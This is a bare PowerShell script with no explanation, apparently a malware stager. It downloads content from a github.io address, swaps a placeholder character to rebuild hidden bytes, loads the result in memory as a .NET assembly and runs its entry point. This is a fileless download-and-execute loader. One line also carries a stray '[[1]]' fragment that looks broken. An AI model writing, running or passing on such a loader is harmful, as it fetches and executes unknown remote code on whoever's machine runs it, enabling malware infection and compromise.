$url1 = "https://stinkylick.github.io/stinkylick/2/a"
$bytes = (Invoke-WebRequest -Uri $url1 -UseBasicParsing).Content | ForEach-Object { [System.Convert]::ToByte($_) }
$stringContent = [System.Text.Encoding]::UTF8.GetString($bytes)
$modifiedString = $stringContent.Replace("[1]", "C") [[1]]
$modifiedBytes = [System.Text.Encoding]::UTF8.GetBytes($modifiedString)
$assembly = [System.Reflection.Assembly]::Load($modifiedBytes)
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, $null)
